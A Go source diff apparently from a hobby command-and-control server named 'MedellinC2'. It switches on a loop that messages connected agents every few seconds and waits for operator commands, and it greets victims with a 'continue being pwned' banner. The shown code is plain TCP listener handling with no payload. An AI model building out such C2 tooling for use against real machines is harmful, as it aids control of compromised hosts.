@@ -6,7 +6,6 @@ package cmd
 
 import (
 	"bufio"
-	"fmt"
 	"io"
 	"log"
 	"net"
@@ -78,8 +77,6 @@ func handleClientRequest(con net.Conn) {
 			} */
 	}
 
-	//data.AwaitCommands()
-
 	for {
 		// Waiting for the client request
 		clientRequest, err := clientReader.ReadString('\n')
@@ -100,17 +97,18 @@ func handleClientRequest(con net.Conn) {
 			return
 		}
 
-		// Responding to the client request
+		// RESPOND FROM SERVER TO THE CLIENTS (agents)
 		/* Send Command to Agent Periodically */
-		/*
-			t := time.NewTicker(3 * time.Second)
-			defer t.Stop()
-			for range t.C {
-				if _, err = con.Write([]byte("Waiting for commands from C2 server\n")); err != nil {
-					log.Printf("failed to respond to client: %v\n", err)
-				}
-			} */
-
+		/*data.AwaitCommands()*/
+		t := time.NewTicker(3 * time.Second)
+		defer t.Stop()
+		for range t.C {
+			if _, err = con.Write([]byte("Waiting for commands from C2 server\n")); err != nil {
+				log.Printf("failed to respond to client: %v\n", err)
+			}
+			data.AwaitCommands()
+		}
+		/* Below does NOT send messages to the client every few seconds like above. Every time agent runs any command, the below message will print */
 		if _, err = con.Write([]byte("Successfully Connected to MedellinC2! Please await commands from the C2 server and continue being pwned!\n")); err != nil {
 			log.Printf("failed to respond to client: %v\n", err)
 		}
@@ -158,21 +156,6 @@ func server() {
 	}
 }
 
-// http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang
-
-// Accept Loop
-func acceptLoop(l net.Listener) {
-	defer l.Close()
-	for {
-		c, err := l.Accept()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println("New Connection found")
-		handleClientRequest(c)
-	}
-}
-
 //Purpose: Successfully checks for all open ports (stored in database)
 func checkListenerPorts() {
 	//Check all open ports in Listeners table in a loop and allow connections over those ports
@@ -190,7 +173,7 @@ func checkListenerPorts() {
 		}
 		go openPorts(listener2)
 	}
-	println("New Listener Started")
+	//println("New Listener Started")
 
 }
 
@@ -217,3 +200,5 @@ func printCurrentListerPorts() {
 	}
 	print("\n")
 }
+
+// http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang
